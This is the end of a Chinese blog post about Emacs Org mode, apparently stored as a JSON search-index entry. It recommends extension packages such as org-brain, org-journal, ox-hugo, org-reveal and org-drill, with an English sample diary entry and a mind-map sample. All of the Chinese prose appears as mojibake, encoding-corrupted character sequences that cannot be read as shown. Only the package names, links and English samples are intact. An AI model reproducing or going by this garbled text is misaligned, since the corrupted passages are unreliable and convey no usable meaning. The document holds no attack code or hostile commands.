å–œæ¬¢çš„æ ·å­ã€‚\nä¸€äº›æ‰©å±•åŒ… Org mode çš„å¦ä¸€å¼ºå¤§ä¹‹å¤„ï¼Œæ˜¯å®ƒè¿è¡Œåœ¨ emacs è¿™ä¸ªå¹³å°ä¸Šï¼Œemacs å¼ºå¤§çš„æ‰©å±•æ€§å¯ä»¥è®©å¼€å‘è€…ä¸º org mode åˆ›ä½œå„ç§å„æ ·çš„æ’ä»¶ï¼Œæ»¡è¶³ä½ åšç¬”è®°ã€å†™åšå®¢ã€å†™è®ºæ–‡ã€ç®¡ç†ä¸ªäºº wiki ç”šè‡³å†™ PPT ç­‰å„ç§éœ€æ±‚ã€‚\nä¸‹é¢ä»‹ç»ä¸€äº›æˆ‘æ­£åœ¨ä½¿ç”¨çš„æ‰©å±•åŒ…ï¼Œè¯¦ç»†çš„åŠŸèƒ½è¯·åˆ°å„è‡ªçš„ä¸»é¡µå»äº†è§£ã€‚é™¤äº†è¿™äº›è¿˜æœ‰å¾ˆå¤šæ‰©å±•åŒ…ï¼Œæœ‰ä¸€äº›æˆ‘ä¹Ÿåœ¨ç”¨çš„ç”¨æ¥åŠ å¼ºåŸç”ŸåŠŸèƒ½çš„åŒ…æˆ‘æ²¡å†™å‡ºæ¥ï¼Œç­‰ä½ ä»¬çœŸæ­£ä½¿ç”¨ org mode æ—¶è‡ªç„¶ä¼šå»äº†è§£äº†ã€‚\norg-brain Homepage: http://github.com/Kungsgeten/org-brain\nå¯ä»¥åƒæ€ç»´å¯¼å›¾ä¸€æ ·ç»„ç»‡ä½ çš„ç¬”è®°ï¼Œç®¡ç†ä¸åŒç¬”è®°é—´çš„é€»è¾‘å…³ç³»ï¼Œè€Œä¸”æä¾›äº†ä¸€ä¸ªç±»ä¼¼ä¸ªäºº wiki ç•Œé¢çš„ visualize æ¨¡å¼ã€‚\nPINNED: Index +-Python Game development-+-Game design +-Programming books | Programming-+-Emacs | | | +-----------------+-----------------+ | V Game programming \u0026lt;-\u0026gt; Computer games Game Maker Unity --- Resources --------------------------------- - https://en.wikipedia.org/wiki/Game_programming - Passing Through Ghosts in Pac-Man - In-House Engine Development: Technical Tips --- Text -------------------------------------- Game programming is the art of programming computer games... org-journal Homepage: http://github.com/bastibe/org-journal\nå†™æ—¥è®°ä¸“ç”¨ï¼Œæ–¹ä¾¿è‡ªåŠ¨ç”Ÿæˆæ—¥è®°ï¼Œé…ç½®æ—¥è®°æ¨¡æ¿ï¼Œè€Œä¸”æä¾›å¼ºå¤§çš„æœç´¢åŠŸèƒ½ã€‚\nç¤ºä¾‹æ—¥è®° * Tuesday, 06/04/13 ** 10:28 Company meeting Endless discussions about projects. Not much progress ** 11:33 Work on org-journal For the longest time, I wanted to have a cool diary app on my computer. However, I simply lacked the right tool for that job. After many hours of searching, I finally found PersonalDiary on EmacsWiki. PersonalDiary is a very simple diary system based on the emacs calendar. It works pretty well, but I don't really like that it only uses unstructured text. Thus, I spent the last two hours making that diary use org-mode and represent every entry as an org-mode headline. Very cool! ** 15:33 Work on org-journal Now my journal automatically creates the right headlines (adds the current time stamp if on the current day, does not add a time stamp for any other day). Additionally, it automatically collapses the headlines in the org-file to the right level (shows everything if in view mode, shows only headlines in new-entry-mode). Emacs and elisp are really cool! ** 16:40 Work on org-journal I uploaded my journal mode to marmalade and Github! Awesome! ** TODO teach org-journal how to brew coffee ox-hugo Homepage: https://ox-hugo.scripter.co\nå°† org æ–‡ä»¶å¯¼å‡ºä¸º hugo çš„ markdown æ–‡ä»¶ï¼Œæ”¯æŒå¤§éƒ¨åˆ† hugo é…ç½®ï¼Œè€Œä¸”ä½ å¯ä»¥é€‰æ‹©å¯¼å‡ºæŸä¸ªå­æ ‘ä¸ºä¸€ç¯‡æ–‡ç« ï¼Œè®¾ç½®äº† TODO çš„å­æ ‘è¢«è§†ä¸ºè‰ç¨¿ã€‚\nç°åœ¨è¿™ä¸ªåšå®¢å°±æ˜¯ç”¨è¿™ä¸ªåŒ…å¯¼å‡ºæ–‡ç« çš„ã€‚\norg-reveal Homepage: https://github.com/yjwen/org-reveal\nå‰é¢æˆ‘è¯´å¯ä»¥ç”¨ org mode å†™ PPTï¼Œå¹¶ä¸æ˜¯çœŸçš„èƒ½å†™ PPTï¼Œä½†æ˜¯ org-reveal å¯ä»¥å€ŸåŠ©å‰ç«¯æ¡†æ¶ reveal.js å°† org æ–‡ä»¶å¯¼å‡ºæˆä¸€ä¸ªå¹»ç¯ç‰‡ç½‘é¡µã€‚\nè™½ç„¶åŠŸèƒ½ä¸Šå¯èƒ½æ²¡ PPT é‚£ä¹ˆä¸°å¯Œï¼Œä½†æ˜¯ç»å¯¹å¯ä»¥åº”ä»˜å¤§éƒ¨åˆ†å·¥ä½œå±•ç¤ºçš„éœ€æ±‚ï¼Œå…³é”®æ˜¯å¯ä»¥è®©ä½ ä»å„ç§å­—ä½“å›¾ç‰‡çš„å¤§å°ã€ä½ç½®ã€å°ºå¯¸é—®é¢˜ä¸­è§£è„±ï¼Œåƒå†™æ–‡ç« ä¸€æ ·å†™å¹»ç¯ç‰‡ï¼Œä½ åªéœ€è¦ä¸“æ³¨äºå†…å®¹ã€‚\norg-drill Homepage: https://gitlab.com/phillord/org-drill\né€šè¿‡ org mode å®ç°ç±»ä¼¼äºâ€œè®°å¿†å¡ç‰‡â€çš„åŠŸèƒ½ï¼Œå¯ä»¥é€‰æ‹©ä¸åŒè®°å¿†ç®—æ³•æ¥åˆ¶å®šå¤ä¹ è®¡åˆ’ï¼Œæ­é… org capture æ¥åˆ¶ä½œç”Ÿè¯æœ¬æ•ˆæœå¾ˆå¥½ï¼Œæˆ‘å‡†å¤‡ç”¨å®ƒæ¥èƒŒè‹±è¯­å•è¯ã€‚\nåˆ†äº«ä¸€ç¯‡æ•™å­¦æ–‡ç« ï¼šhttps://jmm.io/pr/emacs-meetup/#/ ï¼Œè¿™æ–‡ç« å°±æ˜¯ç”¨ reveal.js åˆ¶ä½œçš„ã€‚\næœ€å å…¶å®è‡ªå·±ä¹ æƒ¯çš„å·¥å…·æ‰æ˜¯æ•ˆç‡æœ€é«˜çš„ï¼Œå¦‚æœä½ åªæ˜¯æƒ³è¦ä¸€ä¸ªå¯ä»¥å¿«é€Ÿä¸Šæ‰‹ä½¿ç”¨çš„å·¥å…·ï¼Œorg mode å¯èƒ½ä¸é€‚åˆä½ ï¼Œå› ä¸ºå­¦ä¹ æˆæœ¬å¤ªé«˜äº†(ä¸»è¦æ˜¯ emacs ä¸Šæ‰‹éš¾)ã€‚\næˆ‘ä¸ªäººæ¯”è¾ƒå–œæ¬¢æŠ˜è…¾å„ç§å·¥å…·è½¯ä»¶ï¼Œæˆ‘æŠŠ emacs å’Œ org mode ä¹Ÿæ˜¯çœ‹ä½œéœ€è¦ä¸æ–­å­¦ä¹ çš„çŸ¥è¯†ï¼Œæ‰€ä»¥å¯¹è¿™ç§ä¸€è¾¹ç”¨ä¸€è¾¹å­¦çš„çŠ¶æ€è¿˜æŒºä¹åœ¨å…¶ä¸­çš„ã€‚ä½†ä¸å¾—ä¸è¯´è¿™å¾ˆå®¹æ˜“è®©ä½ ä¸Šå¤´ï¼Œè€½è¯¯ä½ å­¦ä¹ çœŸæ­£éœ€è¦çš„çŸ¥è¯†çš„æ—¶é—´ã€‚\nå³ä½¿è¿™ç¯‡æ˜¯å®‰åˆ©æ–‡ç« ï¼Œæœ€åè¿˜æ˜¯åŠä½ è°¨æ…å…¥å‘ğŸ™ƒ\n","date":"2021-01-09","permalink":"https://zrquan.github.io/posts/org-mode/","tags":["emacs","org-mode"],"title":"My life in plain text"}]